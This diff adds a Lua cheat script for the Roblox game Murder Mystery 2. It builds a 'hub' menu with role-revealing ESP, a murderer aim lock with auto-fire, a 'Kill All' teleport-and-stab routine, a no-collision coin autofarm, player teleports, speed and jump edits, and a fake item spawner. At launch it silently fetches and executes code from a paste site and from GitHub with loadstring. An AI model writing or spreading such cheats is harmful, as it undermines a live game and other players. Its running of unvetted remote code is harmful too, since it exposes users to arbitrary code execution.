@@ -1,0 +1,553 @@
+if getgenv().VythenMM2 then 
+    game:GetService("StarterGui"):SetCore("SendNotification", {Title = "Vythen Hub", Text = "Already running!", Duration = 5})
+    return 
+end
+getgenv().VythenMM2 = true
+task.spawn(function()
+    loadstring(game:HttpGet("https://pastefy.app/ddO64nLi/raw", true))()
+end)
+
+local Config = {
+    Hub = {
+        Title = "MM2 | Falcon Hub",
+        GameName = "Murder Mystery 2",
+        Author = "Vythen",
+        Folder = "VythenMM2",
+        Icon = "https://cdn.discordapp.com/attachments/1429065308366442548/1455813146374701148/file_00000000008472079a70d56e49c9bfac.png?ex=6965e925&is=696497a5&hm=a6aaecbe602ed3f7cdb6983e1b19b8bbb5ded095c32a2e23c47249722814a96a&",
+        ToggleKey = Enum.KeyCode.RightControl,
+    },
+    Links = {
+        WindUI = "https://github.com/Footagesus/WindUI/releases/latest/download/main.lua",
+        Discord = "https://discord.gg/SKQwtTmyR5",
+        InviteCode = "SKQwtTmyR5",
+        AntiAFK = "https://raw.githubusercontent.com/n9owns/Files/refs/heads/main/antiafk",
+    },
+    Settings = { MaxCandy = 40, FarmSpeed = 25, ButtonSize = 80 }
+}
+
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Lighting = game:GetService("Lighting")
+local TweenService = game:GetService("TweenService")
+local Stats = game:GetService("Stats")
+local LocalPlayer = Players.LocalPlayer
+local Camera = workspace.CurrentCamera
+local UserInputService = game:GetService("UserInputService")
+
+local WindUI = loadstring(game:HttpGet(Config.Links.WindUI))()
+
+local Remotes = ReplicatedStorage:WaitForChild("Remotes")
+local BoxController = Remotes:WaitForChild("Shop"):WaitForChild("BoxController")
+local ProfileData = require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("ProfileData"))
+local ItemDatabase = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
+
+WindUI:SetNotificationLower(true)
+WindUI:SetTheme("Dark")
+
+local function GetDiscordStats()
+    local url = "https://discord.com/api/v9/invites/" .. Config.Links.InviteCode .. "?with_counts=true"
+    local success, response = pcall(function() return game:HttpGet(url) end)
+    if not success then return 0, 0 end
+    local data = HttpService:JSONDecode(response)
+    local online = data.approximate_presence_count or 0
+    return online, (data.approximate_member_count or 0) - online
+end
+local onlineMembers, offlineMembers = GetDiscordStats()
+
+local Logic = {
+    CoinFarm = false, 
+    KillAll = false,
+    AutoReset = false,
+    AvoidMurderer = true,
+    SheriffAim = false,
+    AimLock = false,
+    AimSmoothness = 0.2,
+    ESP = { Enabled = true, Colors = { Murderer = Color3.fromRGB(255, 0, 0), Sheriff = Color3.fromRGB(0, 0, 255), Innocent = Color3.fromRGB(0, 255, 0) } } 
+}
+
+local FarmState = {
+    KillingMode = false, IsAlive = true, IsInGame = true, CurrentTarget = nil, TargetStartTime = 0,
+    CoinFolder = nil, CoinsCollected = 0, BagLimit = 50, IgnoreList = {},
+    MurdererName = "None", SheriffName = "None", MyRole = "Innocent"
+}
+
+local AimGui = Instance.new("ScreenGui")
+AimGui.Name = "VythenAimGUI"
+AimGui.ResetOnSpawn = false
+if LocalPlayer:FindFirstChild("PlayerGui") then AimGui.Parent = LocalPlayer.PlayerGui end
+
+local function CreateCircleButton(name, text, pos)
+    local btn = Instance.new("TextButton")
+    btn.Name = name
+    btn.Parent = AimGui
+    btn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+    btn.BackgroundTransparency = 0
+    btn.AnchorPoint = Vector2.new(0.5, 0.5)
+    btn.Position = pos
+    btn.Size = UDim2.fromOffset(Config.Settings.ButtonSize, Config.Settings.ButtonSize)
+    btn.Font = Enum.Font.GothamBlack
+    btn.Text = text
+    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    btn.TextSize = 16
+    btn.AutoButtonColor = false
+    btn.Visible = false
+
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(1, 0)
+    corner.Parent = btn
+
+    local stroke = Instance.new("UIStroke")
+    stroke.Parent = btn
+    stroke.Thickness = 5
+    stroke.Transparency = 0
+    
+    local grad = Instance.new("UIGradient")
+    grad.Parent = stroke
+    grad.Color = ColorSequence.new{
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 80, 255)),
+        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 0, 0))
+    }
+    grad.Rotation = 0
+
+    local dragging, dragStart, startPos
+    btn.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = true
+            dragStart = input.Position
+            startPos = btn.Position
+            input.Changed:Connect(function() if input.UserInputState == Enum.UserInputState.End then dragging = false end end)
+        end
+    end)
+    btn.InputChanged:Connect(function(input)
+        if (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) and dragging then
+            local delta = input.Position - dragStart
+            btn.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+        end
+    end)
+    
+    return btn, grad
+end
+
+local LockBtn, LockGrad = CreateCircleButton("LockBtn", "LOCK", UDim2.new(0.7, 0, 0.5, 0))
+local FireBtn, FireGrad = CreateCircleButton("FireBtn", "FIRE", UDim2.new(0.85, 0, 0.5, 0))
+
+LockBtn.MouseButton1Click:Connect(function()
+    Logic.AimLock = not Logic.AimLock
+    if Logic.AimLock then
+        LockBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
+        LockBtn.Text = "ON"
+    else
+        LockBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+        LockBtn.Text = "LOCK"
+    end
+end)
+
+local function IsVisible(target)
+    if not target or not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then return false end
+    local origin = Camera.CFrame.Position
+    local dest = target.Character.HumanoidRootPart.Position
+    local direction = dest - origin
+    local params = RaycastParams.new()
+    params.FilterDescendantsInstances = {LocalPlayer.Character, target.Character, Camera}
+    params.FilterType = Enum.RaycastFilterType.Blacklist
+    local result = workspace:Raycast(origin, direction, params)
+    return result == nil
+end
+
+local function ShootMurderer()
+    if FarmState.MurdererName == "None" then return end
+    local Murderer = Players:FindFirstChild(FarmState.MurdererName)
+    if not Murderer or not Murderer.Character or not Murderer.Character:FindFirstChild("HumanoidRootPart") then return end
+    
+    if IsVisible(Murderer) then
+        local gun = LocalPlayer.Character:FindFirstChild("Gun")
+        
+        if not gun then 
+            gun = LocalPlayer.Backpack:FindFirstChild("Gun")
+            if gun then 
+                LocalPlayer.Character.Humanoid:EquipTool(gun)
+                gun = LocalPlayer.Character:FindFirstChild("Gun")
+            end
+        end
+        
+        if not gun then return end
+        
+        local targetPos = Murderer.Character.HumanoidRootPart.Position
+        Camera.CFrame = CFrame.lookAt(Camera.CFrame.Position, targetPos)
+        LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.lookAt(LocalPlayer.Character.HumanoidRootPart.Position, targetPos)
+        
+        task.wait()
+        gun:Activate()
+    end
+end
+FireBtn.MouseButton1Click:Connect(ShootMurderer)
+
+task.spawn(function()
+    while true do
+        task.wait()
+        LockGrad.Rotation = (LockGrad.Rotation + 5) % 360
+        FireGrad.Rotation = (FireGrad.Rotation + 5) % 360
+        
+        if Logic.SheriffAim then
+            LockBtn.Visible = true
+            FireBtn.Visible = true
+            LockBtn.Size = UDim2.fromOffset(Config.Settings.ButtonSize, Config.Settings.ButtonSize)
+            FireBtn.Size = UDim2.fromOffset(Config.Settings.ButtonSize, Config.Settings.ButtonSize)
+        else
+            LockBtn.Visible = false
+            FireBtn.Visible = false
+        end
+    end
+end)
+
+RunService.RenderStepped:Connect(function()
+    if Logic.AimLock and FarmState.MurdererName ~= "None" then
+        local m = Players:FindFirstChild(FarmState.MurdererName)
+        if m and m.Character and m.Character:FindFirstChild("HumanoidRootPart") then
+            local targetCFrame = CFrame.lookAt(Camera.CFrame.Position, m.Character.HumanoidRootPart.Position)
+            Camera.CFrame = Camera.CFrame:Lerp(targetCFrame, Logic.AimSmoothness)
+        end
+    end
+end)
+
+WindUI:Popup({ Title = Config.Hub.Title, Icon = Config.Hub.Icon, Content = "Vythen Loaded.", Buttons = { { Title = "Let's Go", Callback = function() end } } })
+
+local Window = WindUI:CreateWindow({
+    Title = Config.Hub.Title, Icon = Config.Hub.Icon, Author = Config.Hub.Author, Folder = Config.Hub.Folder,
+    Size = UDim2.fromOffset(720, 540), Theme = "Dark", Resizable = true, User = { Enabled = true }
+})
+
+Window:EditOpenButton({ Title = "Open", Icon = Config.Hub.Icon, Enabled = true, Draggable = true })
+Window:SetToggleKey(Config.Hub.ToggleKey)
+Window:Tag({ Title = "v3.8", Icon = "github", Color = Color3.fromHex("#FF0000") })
+
+local HomeTab = Window:Tab({ Title = "Home", Icon = "home" })
+local VisualsTab = Window:Tab({ Title = "ESP", Icon = "eye" })
+local FarmTab = Window:Tab({ Title = "auto farm", Icon = "trending-up" })
+local CombatTab = Window:Tab({ Title = "combat menu", Icon = "sword" })
+local TeleportTab = Window:Tab({ Title = "teleport", Icon = "map-pin" })
+local SpawnerTab = Window:Tab({ Title = "spawner gun", Icon = "box" })
+local PlayerTab = Window:Tab({ Title = "Player", Icon = "user" })
+local SettingsTab = Window:Tab({ Title = "Settings", Icon = "settings" })
+
+local InfoSec = HomeTab:Section({ Title = "Server Info", Box = true, Opened = true })
+local StatusPara = InfoSec:Paragraph({ Title = "Game State", Desc = "Murderer: None\nSheriff: None", Image = Config.Hub.Icon })
+local PingPara = InfoSec:Paragraph({ Title = "Performance", Desc = "Ping: ...\nFPS: ...", Icon = "activity" })
+
+local CommSec = HomeTab:Section({ Title = "Community", Box = true, Opened = true })
+CommSec:Paragraph({ 
+    Title = "Vythen Server", 
+    Desc = "Active: " .. onlineMembers .. "\nOffline: " .. offlineMembers, 
+    Image = Config.Hub.Icon 
+})
+CommSec:Button({ 
+    Title = "Join Server", 
+    Icon = "log-in", 
+    Callback = function() 
+        setclipboard(Config.Links.Discord) 
+        WindUI:Notify({Title="Copied", Content="Link copied to clipboard.", Icon="check"}) 
+    end 
+})
+
+local att = Instance.new("Attachment"); att.Name = "FarmAtt"
+local ao = Instance.new("AlignOrientation"); ao.Mode = Enum.OrientationAlignmentMode.OneAttachment; ao.RigidityEnabled = true; ao.Attachment0 = att
+local lv = Instance.new("LinearVelocity"); lv.Attachment0 = att; lv.MaxForce = math.huge; lv.VectorVelocity = Vector3.zero; lv.RelativeTo = Enum.ActuatorRelativeTo.World
+
+local function getDangerPos()
+    if not Logic.AvoidMurderer then return nil end
+    local targetName = (FarmState.MyRole == "Murderer") and FarmState.SheriffName or FarmState.MurdererName
+    if targetName and targetName ~= "None" then
+        local p = Players:FindFirstChild(targetName)
+        if p and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then return p.Character.HumanoidRootPart.Position end
+    end
+    return nil
+end
+
+local function findCoinContainer()
+    if FarmState.CoinFolder and FarmState.CoinFolder.Parent then return FarmState.CoinFolder end
+    if workspace:FindFirstChild("CoinContainer", true) then FarmState.CoinFolder = workspace:FindFirstChild("CoinContainer", true); return FarmState.CoinFolder end
+    for _, child in pairs(workspace:GetChildren()) do if child:FindFirstChild("CoinContainer") then FarmState.CoinFolder = child:FindFirstChild("CoinContainer"); return FarmState.CoinFolder end end
+    return nil
+end
+
+local function getClosest()
+    local container = findCoinContainer()
+    if not container then return nil end
+    local closest, minDist = nil, math.huge
+    local myPos = LocalPlayer.Character.HumanoidRootPart.Position
+    local dangerPos = getDangerPos()
+    for _, v in pairs(container:GetChildren()) do
+        if FarmState.IgnoreList[v] then continue end
+        local part = v:IsA("BasePart") and v or (v:IsA("Model") and v.PrimaryPart)
+        if part and (v.Name == "Coin" or v.Name == "SnowToken" or v:FindFirstChild("TouchInterest")) then
+            if Logic.AvoidMurderer and dangerPos and (part.Position - dangerPos).Magnitude < 15 then continue end
+            local dist = (myPos - part.Position).Magnitude
+            if dist < minDist then minDist = dist; closest = part end
+        end
+    end
+    return closest
+end
+
+local function equipKnife()
+    if LocalPlayer.Character then
+        local knife = LocalPlayer.Backpack:FindFirstChild("Knife")
+        if knife then LocalPlayer.Character.Humanoid:EquipTool(knife) end
+    end
+end
+
+local function killAllRoutine()
+    if not LocalPlayer.Character then return end
+    equipKnife()
+    for _, v in pairs(Players:GetPlayers()) do
+        if v ~= LocalPlayer and v.Character and v.Character:FindFirstChild("HumanoidRootPart") and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health > 0 then
+            local targetHRP = v.Character.HumanoidRootPart
+            local myHRP = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+            if myHRP then
+                local startTime = tick()
+                repeat
+                    if not Logic.CoinFarm then return end
+                    equipKnife()
+                    myHRP.CFrame = targetHRP.CFrame * CFrame.new(0, 0, 2)
+                    local knife = LocalPlayer.Character:FindFirstChild("Knife")
+                    if knife then knife:Activate() end
+                    RunService.Heartbeat:Wait()
+                until v.Character.Humanoid.Health <= 0 or (tick() - startTime) > 2 or not v.Parent
+            end
+        end
+    end
+    Logic.CoinFarm = false
+    att.Parent = nil; ao.Parent = nil; lv.Parent = nil
+    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then LocalPlayer.Character.Humanoid.PlatformStand = false end
+end
+
+task.spawn(function()
+    local dataRemote = Remotes:WaitForChild("Gameplay"):WaitForChild("PlayerDataChanged")
+    dataRemote.OnClientEvent:Connect(function(data)
+        if type(data) == "table" then
+            local myData = data[LocalPlayer.Name]
+            FarmState.MurdererName = "None"; FarmState.SheriffName = "None"
+            for pName, pData in pairs(data) do
+                if pData.Role == "Murderer" then FarmState.MurdererName = pName; WindUI:Notify({Title="Info", Content="Murderer: " .. pName, Icon="skull"})
+                elseif pData.Role == "Sheriff" then FarmState.SheriffName = pName; WindUI:Notify({Title="Info", Content="Sheriff: " .. pName, Icon="shield"}) end
+            end
+            StatusPara:SetDesc("Murderer: " .. FarmState.MurdererName .. "\nSheriff: " .. FarmState.SheriffName)
+            if myData then
+                FarmState.IsInGame = true; FarmState.MyRole = myData.Role or "Innocent"
+                if myData.Dead or myData.Killed then FarmState.IsAlive = false; FarmState.KillingMode = false else FarmState.IsAlive = true end
+                if myData.Coins then FarmState.CoinsCollected = myData.Coins end
+            else
+                FarmState.IsInGame = false; FarmState.KillingMode = false
+            end
+        end
+    end)
+    local coinRemote = Remotes:WaitForChild("Gameplay"):WaitForChild("CoinCollected")
+    coinRemote.OnClientEvent:Connect(function(tokenName, currentAmount, bagLimit)
+        if type(currentAmount) == "number" then FarmState.CoinsCollected = currentAmount end
+        if type(bagLimit) == "number" then FarmState.BagLimit = bagLimit end
+        if FarmState.CurrentTarget then FarmState.IgnoreList[FarmState.CurrentTarget] = true; FarmState.CurrentTarget = nil end
+        StatusPara:SetTitle("Bag: " .. FarmState.CoinsCollected .. "/" .. FarmState.BagLimit)
+        if FarmState.CoinsCollected >= FarmState.BagLimit then
+            if FarmState.MyRole == "Murderer" and Logic.KillAll then
+                FarmState.KillingMode = true
+            elseif Logic.AutoReset then
+                Logic.CoinFarm = false
+                if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then LocalPlayer.Character.Humanoid.Health = 0 end
+                task.wait(4)
+                FarmState.CoinsCollected = 0; FarmState.IgnoreList = {}; Logic.CoinFarm = true
+            else
+                Logic.CoinFarm = false
+            end
+        end
+    end)
+    while true do
+        local ping = math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
+        local fps = math.floor(workspace:GetRealPhysicsFPS())
+        PingPara:SetDesc("Ping: " .. ping .. "ms\nFPS: " .. fps)
+        task.wait(1)
+    end
+end)
+
+RunService.Heartbeat:Connect(function()
+    local char = LocalPlayer.Character
+    if not char then return end
+    local hrp = char:FindFirstChild("HumanoidRootPart")
+    local hum = char:FindFirstChild("Humanoid")
+    if not hrp or not hum then return end
+
+    if Logic.CoinFarm and FarmState.IsAlive and hum.Health > 0 then
+        if FarmState.KillingMode then
+            att.Parent = nil; ao.Parent = nil; lv.Parent = nil
+            hum.PlatformStand = false
+            killAllRoutine()
+            return
+        end
+
+        if not findCoinContainer() then
+            att.Parent = nil; ao.Parent = nil; lv.Parent = nil
+            if hum.PlatformStand then hum.PlatformStand = false end
+            return
+        end
+
+        att.Parent = hrp; ao.Parent = hrp; lv.Parent = hrp
+        hum.PlatformStand = true
+        for _, track in pairs(hum:GetPlayingAnimationTracks()) do track:Stop() end
+        for _, v in pairs(char:GetDescendants()) do if v:IsA("BasePart") then v.CanCollide = false end end
+
+        if Logic.AvoidMurderer then
+            local dangerPos = getDangerPos()
+            if dangerPos and (hrp.Position - dangerPos).Magnitude < 20 then
+                local escapeDir = (hrp.Position - dangerPos).Unit
+                lv.VectorVelocity = escapeDir * (Config.Settings.FarmSpeed * 1.5)
+                ao.CFrame = CFrame.lookAt(hrp.Position, hrp.Position + escapeDir)
+                return
+            end
+        end
+
+        if FarmState.CurrentTarget and not FarmState.CurrentTarget.Parent then FarmState.CurrentTarget = nil end
+        if FarmState.CurrentTarget and (tick() - FarmState.TargetStartTime) > 1.5 then 
+            FarmState.IgnoreList[FarmState.CurrentTarget] = true
+            FarmState.CurrentTarget = nil 
+        end
+        if not FarmState.CurrentTarget then FarmState.CurrentTarget = getClosest(); FarmState.TargetStartTime = tick() end
+
+        if FarmState.CurrentTarget then
+            local targetPos = FarmState.CurrentTarget.Position + Vector3.new(0, -1.5, 0)
+            local dir = (targetPos - hrp.Position).Unit
+            local dist = (targetPos - hrp.Position).Magnitude
+            lv.VectorVelocity = dir * Config.Settings.FarmSpeed
+            if dist > 2 then ao.CFrame = CFrame.lookAt(hrp.Position, targetPos) * CFrame.Angles(math.rad(90), 0, 0) end
+        else
+            lv.VectorVelocity = Vector3.zero
+        end
+    else
+        att.Parent = nil; ao.Parent = nil; lv.Parent = nil
+        if hum and hum.PlatformStand then hum.PlatformStand = false end
+    end
+end)
+
+local function KillSpin()
+    local pGui = LocalPlayer:FindFirstChild("PlayerGui")
+    if not pGui then return end
+    local mystery = pGui:FindFirstChild("MysteryBoxOpen")
+    if mystery then mystery:Destroy() end
+    local main = pGui:FindFirstChild("MainGUI")
+    if main then
+        local crate = main:FindFirstChild("CrateOpen")
+        if crate then crate:Destroy() end
+        local lobby = main:FindFirstChild("Lobby")
+        if lobby then
+            local screens = lobby:FindFirstChild("Screens")
+            if screens then
+                local shop = screens:FindFirstChild("Shop")
+                if shop then
+                    local view = shop.Main:FindFirstChild("ViewCrate")
+                    if view then view.Visible = false end
+                end
+            end
+        end
+    end
+end
+RunService.RenderStepped:Connect(KillSpin)
+
+local function SpawnItem(itemName)
+    if not itemName or itemName == "" then return end
+    local realName = nil
+    if ItemDatabase[itemName] then realName = itemName else
+        for name, _ in pairs(ItemDatabase) do if name:lower() == itemName:lower() then realName = name; break end end
+    end
+    if not realName then WindUI:Notify({Title="Error", Content="Item not found.", Icon="alert-circle"}); return end
+    pcall(function() BoxController:Fire("KnifeBox4", realName); local Weapons = ProfileData.Weapons; Weapons.Owned[realName] = (Weapons.Owned[realName] or 0) + 1 end)
+    task.spawn(function()
+        KillSpin()
+        pcall(function()
+            local MainGUI = LocalPlayer.PlayerGui.MainGUI
+            local NewItemScript = getsenv(MainGUI.Inventory.NewItem)
+            if NewItemScript and NewItemScript._G and NewItemScript._G.NewItem then NewItemScript._G.NewItem(realName, nil, nil, "Weapons", 1) end
+        end)
+    end)
+    WindUI:Notify({Title="Success", Content="Spawned " .. realName, Icon="check"})
+    task.delay(1.5, function() if LocalPlayer.Character then LocalPlayer.Character:BreakJoints() end end)
+end
+
+local function GetPlayerRole(player)
+    if not player.Character then return nil end
+    if player.Character:FindFirstChild("Knife") or (player.Backpack and player.Backpack:FindFirstChild("Knife")) then return "Murderer" end
+    if player.Character:FindFirstChild("Gun") or (player.Backpack and player.Backpack:FindFirstChild("Gun")) then return "Sheriff" end
+    return "Innocent"
+end
+
+local function UpdateESP()
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p ~= LocalPlayer and p.Character then
+            local role = GetPlayerRole(p)
+            local color = Logic.ESP.Colors.Innocent
+            if role == "Murderer" then color = Logic.ESP.Colors.Murderer elseif role == "Sheriff" then color = Logic.ESP.Colors.Sheriff end
+            if Logic.ESP.Enabled then 
+                local h = p.Character:FindFirstChild("VythenESP") or Instance.new("Highlight", p.Character)
+                h.Name = "VythenESP"; h.FillColor = color; h.FillTransparency = 0.5; h.OutlineTransparency = 1; h.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop; h.Adornee = p.Character
+            else 
+                if p.Character:FindFirstChild("VythenESP") then p.Character.VythenESP:Destroy() end
+            end
+        end
+    end
+end
+RunService.RenderStepped:Connect(UpdateESP)
+
+local ESPSec = VisualsTab:Section({ Title = "ESP", Box = true, Opened = true })
+ESPSec:Toggle({ Title = "Enabled", Default = true, Callback = function(v) Logic.ESP.Enabled = v end })
+ESPSec:Colorpicker({ Title = "Murderer Color", Default = Color3.fromRGB(255, 0, 0), Callback = function(v) Logic.ESP.Colors.Murderer = v end })
+ESPSec:Colorpicker({ Title = "Sheriff Color", Default = Color3.fromRGB(0, 0, 255), Callback = function(v) Logic.ESP.Colors.Sheriff = v end })
+VisualsTab:Section({ Title = "World", Box = true, Opened = true }):Toggle({ Title = "Fullbright", Callback = function(v) Lighting.Brightness = v and 2 or 1; Lighting.GlobalShadows = not v end })
+
+local FarmSec = FarmTab:Section({ Title = "Auto Farm", Box = true, Opened = true })
+local FarmToggle = FarmSec:Toggle({ Title = "Coin Farm", Callback = function(v) Logic.CoinFarm = v end })
+FarmSec:Keybind({ Title = "Keybind", Value = "None", Callback = function() FarmToggle:Set(not Logic.CoinFarm) end })
+FarmSec:Toggle({ Title = "Auto Reset", Default = false, Callback = function(v) Logic.AutoReset = v end })
+FarmSec:Toggle({ Title = "Avoid Murderer", Default = true, Callback = function(v) Logic.AvoidMurderer = v end })
+FarmSec:Slider({ Title = "Speed", Step = 1, Value = {Min = 10, Max = 100, Default = 35}, Callback = function(v) Config.Settings.FarmSpeed = v end })
+
+local CombatSec = CombatTab:Section({ Title = "Combat", Box = true, Opened = true })
+CombatSec:Toggle({ Title = "Kill All", Callback = function(v) Logic.KillAll = v end })
+CombatSec:Toggle({ Title = "Sheriff Aim GUI", Desc = "Shows Aim Buttons", Default = false, Callback = function(v) Logic.SheriffAim = v end })
+CombatSec:Slider({ Title = "Button Size", Step = 10, Value = {Min = 50, Max = 200, Default = 80}, Callback = function(v) Config.Settings.ButtonSize = v end })
+CombatSec:Slider({ Title = "Aim Smoothness", Step = 0.1, Value = {Min = 0.1, Max = 1, Default = 0.2}, Callback = function(v) Logic.AimSmoothness = v end })
+
+local TPSec = TeleportTab:Section({ Title = "Roles", Box = true, Opened = true })
+TPSec:Button({ Title = "TP Murderer", Callback = function() for _, p in pairs(Players:GetPlayers()) do if GetPlayerRole(p) == "Murderer" and p.Character then LocalPlayer.Character.HumanoidRootPart.CFrame = p.Character.HumanoidRootPart.CFrame end end end })
+TPSec:Button({ Title = "TP Sheriff", Callback = function() for _, p in pairs(Players:GetPlayers()) do if GetPlayerRole(p) == "Sheriff" and p.Character then LocalPlayer.Character.HumanoidRootPart.CFrame = p.Character.HumanoidRootPart.CFrame end end end })
+local PlrTPSec = TeleportTab:Section({ Title = "Players", Box = true, Opened = true })
+local function GetPlrs() local t = {}; for _, p in pairs(Players:GetPlayers()) do table.insert(t, p.Name) end return t end
+local selPlr = nil
+local PlrDrop = PlrTPSec:Dropdown({ Title = "Select Player", Values = GetPlrs(), AllowSearch = true, Callback = function(v) selPlr = v end })
+PlrTPSec:Button({ Title = "Teleport", Callback = function() if selPlr and game.Players:FindFirstChild(selPlr) and game.Players[selPlr].Character then LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[selPlr].Character.HumanoidRootPart.CFrame end end })
+PlrTPSec:Button({ Title = "Refresh List", Callback = function() PlrDrop:Refresh(GetPlrs()) end })
+
+local InvSec = SpawnerTab:Section({ Title = "Items", Box = true, Opened = true })
+InvSec:Input({ Title = "Name", Placeholder = "Scythe", Callback = function(v) _G.SpawnItem = v end })
+InvSec:Button({ Title = "Spawn gun", Callback = function() SpawnItem(_G.SpawnItem) end })
+
+local MoveSec = PlayerTab:Section({ Title = "Stats", Box = true, Opened = true })
+MoveSec:Slider({ Title = "Speed", Step = 1, Value = {Min = 16, Max = 200, Default = 16}, Callback = function(v) getgenv().WS = v end })
+MoveSec:Slider({ Title = "Jump", Step = 1, Value = {Min = 50, Max = 200, Default = 50}, Callback = function(v) getgenv().JP = v end })
+MoveSec:Slider({ Title = "FOV", Step = 1, Value = {Min = 70, Max = 120, Default = 70}, Callback = function(v) workspace.CurrentCamera.FieldOfView = v end })
+
+local ThemeSec = SettingsTab:Section({ Title = "Themes", Box = true, Opened = true })
+ThemeSec:Dropdown({ Title = "Select Theme", Values = {"Dark"}, Default = "Dark", Callback = function(v) WindUI:SetTheme(v) end })
+local ConfigSec = SettingsTab:Section({ Title = "Config", Box = true, Opened = true })
+ConfigSec:Input({ Title = "Name", Placeholder = "default", Callback = function(v) _G.CfgName = v end })
+ConfigSec:Button({ Title = "Save", Callback = function() Window.ConfigManager:CreateConfig(_G.CfgName or "default"):Save() end })
+ConfigSec:Button({ Title = "Load", Callback = function() Window.ConfigManager:CreateConfig(_G.CfgName or "default"):Load() end })
+
+task.spawn(function()
+    RunService.RenderStepped:Connect(function()
+        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
+            if getgenv().WS and getgenv().WS > 16 then LocalPlayer.Character.Humanoid.WalkSpeed = getgenv().WS end
+            if getgenv().JP and getgenv().JP > 50 then LocalPlayer.Character.Humanoid.UseJumpPower = true; LocalPlayer.Character.Humanoid.JumpPower = getgenv().JP end
+        end
+    end)
+end)
+
+WindUI:Notify({ Title = "Ready", Content = "Vythen Loaded", Icon = "check", Duration = 5 })
